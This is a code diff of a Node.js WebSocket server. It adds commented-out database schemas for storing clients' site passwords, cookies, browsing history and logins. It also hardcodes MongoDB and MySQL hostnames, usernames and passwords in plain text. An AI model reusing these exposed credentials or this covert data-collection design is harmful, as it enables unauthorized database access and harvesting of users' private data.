@@ -38,6 +38,53 @@ const server = express()
 var app = express();
 const wss = new SocketServer({ server });
 
+//TERMINOLOGY FOR MONGODB
+//collection=table
+//document=row
+/*
+var clientStatus = new mongoose.Schema({//Schemas are predefined json formats that the mongodc collections use, not all fields/values need to be filled out in order to push data to db
+    id: {type: String},
+    status: { type: String}
+  });
+  /*
+var clientUsername = new mongoose.Schema({
+    id: {type: Number},
+    url: { type: String},
+    username: {type: String}
+  });
+var clientPassword = new mongoose.Schema({
+    id: {type: Number},
+    url: { type: String},
+    password: {type: String}
+  });
+var clientHistory = new mongoose.Schema({
+    id: {type: String},
+    url: { type: String},
+    history: {type: [String]}
+  });
+  
+var clientCookies = new mongoose.Schema({
+    id: {type: String},
+    url: { type: String},
+    name: {type: String},
+    value: {type: String}
+  });
+var clientLogin = new mongoose.Schema({
+    id: {type: String},
+    url: {type: String},
+    username: {type: String},
+    password: {type: String}
+});
+
+/*MONGODB LOGIN
+host:ds037977.mlab.com
+port:37977
+username:heroku_qk2c0q0j
+password:i45p143m9dfcn4ocn1urpduu5c
+database:heroku_qk2c0q0j
+*/
+
+
 mysql://b35b454793036b:91686762@us-cdbr-iron-east-01.cleardb.net/heroku_9059f11db120273?reconnect=true
 mongodb://heroku_qk2c0q0j:i45p143m9dfcn4ocn1urpduu5c@ds037977.mlab.com:37977/heroku_qk2c0q0j
 /*
@@ -47,7 +94,61 @@ var mySQL_config = {
   password : '91686762',
   database : 'heroku_9059f11db120273'
 };
+var connection;
+function handleDisconnect() {
+    console.log('1. connecting to db:');
+    connection = mysql.createConnection(mySQL_config); // Recreate the connection, since
+													// the old one cannot be reused.
+
+    connection.connect(function(err) {              	// The server is either down
+        if (err) {                                     // or restarting (takes a while sometimes).
+            console.log('2. error when connecting to db:', err);
+            setTimeout(handleDisconnect, 1000); // We introduce a delay before attempting to reconnect,
+        }                                     	// to avoid a hot loop, and to allow our node script to
+    });                                     	// process asynchronous requests in the meantime.
+    											// If you're also serving http, display a 503 error.
+    connection.on('error', function(err) {
+        console.log('3. db error');
+        if (err.code === 'PROTOCOL_CONNECTION_LOST') { 	// Connection to the MySQL server is usually
+            handleDisconnect();                      	// lost due to either server restart, or a
+        } else {                                      	// connnection idle timeout (the wait_timeout
+            throw err;                                  // server variable configures this)
+        }
+    });
+}
 */
+//handleDisconnect();
+/*
+MongoClient.connect(url, function (err, db) {
+    if (err) {
+      console.log('Unable to connect to the mongoDB server. Error:', err);
+    } else {
+      console.log('Connection established to', url);
+  
+      // do some work here with the database.
+  
+      //Close connection
+      db.close();
+    }
+  });
+  */
+
+/*
+ mongoose.connect(uri, function (err, res) {//connect to db
+    if (err) {
+    console.log ('ERROR connecting to: ' + uri + '. ' + err);
+    } else {
+    console.log ('Succeeded connected to: ' + uri);
+    }
+  });
+  */
+//var db = mongoose.connection;
+var onlineClientsIDS = [];
+
+//var userStatus = mongoose.model('Client Status', clientStatus);
+//var userLogin = mongoose.model('Login Info', clientLogin);
+//var userPassword = mongoose.model('Login Info', clientPassword);
+
 
 wss.on('connection', function connection(ws) {//Upon a connection from a client
     //console.log(database.test("test string"));
@@ -64,17 +165,14 @@ wss.on('connection', function connection(ws) {//Upon a connection from a client
         ws.id = data.id;//get client id
         var type = data.type;
         if (type=='Online'){
-            if (onlineClientsIDS.indexOf(ws) === -1) {//checks to see if client is on online list, if not add it to lsit
+            if (onlineClientsIDS.indexOf(ws.id) === -1) {//checks to see if client is on online list, if not add it to lsit
                 console.log(ws.id+" connected");
-                onlineClientsIDS.push(ws);
+                onlineClientsIDS.push(ws.id);
                 //TODO send user id to database
                 database.setOnline(ws.id);//WORKS
 
                 console.log(ws.id+" online status sent to server");
 
-                wss.clients.forEach(function each(client) {
-                    console.log('Client.ID: ' + client.id);
-                });
             
                 /*
                 var newUser = new userStatus ({
@@ -118,9 +216,9 @@ wss.on('connection', function connection(ws) {//Upon a connection from a client
             //var test = JSON.stringify(clientArr);
             //ws.send(JSON.stringify(database.getAllStatus()));
         }
-        //else if (type=='getList'){//get blacklsited sites
+        else if (type=='getList'){//get blacklsited sites
             //TODO GET BLACK LISTED SITESdatabase.
-        //}
+        }
 
 
 
@@ -178,32 +276,19 @@ wss.on('connection', function connection(ws) {//Upon a connection from a client
         */
 
         //SENDING DATA
-        /*
-        else if (type=='message'){
-            wss.clients.forEach(function each(client) {//sends message back to ALL clients MUST CHANGE
-            //console.log(client);
-            if (client.readyState === WebSocket.OPEN&&client.id===message.targetID) {
+
+        wss.clients.forEach(function each(client) {//sends message back to ALL clients MUST CHANGE
+            if (client.readyState === WebSocket.OPEN) {
                 client.send(message);
-                console.log(message+ " sent to "+client.id);
             }
         });
-    }
-    */
-
-    wss.clients.forEach(function each(client) {//sends message back to ALL clients MUST CHANGE
-        //console.log(client);
-        if (client.readyState === WebSocket.OPEN) {
-            client.send(message);
-            console.log(message+ " sent to "+client.id);
-        }
-    });
 
 
     });
 
     ws.on('close', function (){ //when a client disconnects
         console.log(ws.id +' disconnected')
-        var index = onlineClientsIDS.indexOf(ws);
+        var index = onlineClientsIDS.indexOf(ws.id);
         if (index > -1) {//remove id from active clients array
             onlineClientsIDS.splice(index, 1);
             //TODO SET ID IN ACTIVE USERS DATABASE TO OFFLINE
